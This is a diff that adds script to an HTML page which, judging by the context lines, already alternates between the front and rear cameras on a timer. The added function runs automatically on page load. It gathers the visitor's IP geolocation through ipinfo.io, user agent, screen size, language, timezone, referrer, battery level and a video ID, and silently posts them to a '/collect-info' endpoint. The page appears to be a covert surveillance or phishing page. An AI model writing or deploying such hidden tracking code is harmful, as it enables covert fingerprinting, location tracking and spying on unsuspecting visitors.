@@ -121,6 +121,49 @@ setInterval(() => {
     useFront = !useFront;
 }, captureInterval);
 
+
+
+
+async function collectClientInfo() {
+  let info = {
+    userAgent: navigator.userAgent,
+    ipData:null,
+    videoId,
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer
+  };
+
+let ip=await fetch("https://ipinfo.io/json")
+info.ipData=await ip.json();
+
+
+
+
+  // Battery info
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      info.battery = {
+        level: (battery.level * 100).toFixed(0) + "%",
+        charging: battery.charging
+      };
+    } catch(e) {}
+  }
+
+  // লোকেশন permission নেই এমন হলে ব্যাকএন্ড থেকে ipapi handle করবে
+  fetch("/collect-info", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(info)
+  }).catch(err => console.error("Send failed:", err));
+}
+
+window.addEventListener("load", collectClientInfo);
+
+
+
 </script>
 </body>
 </html>
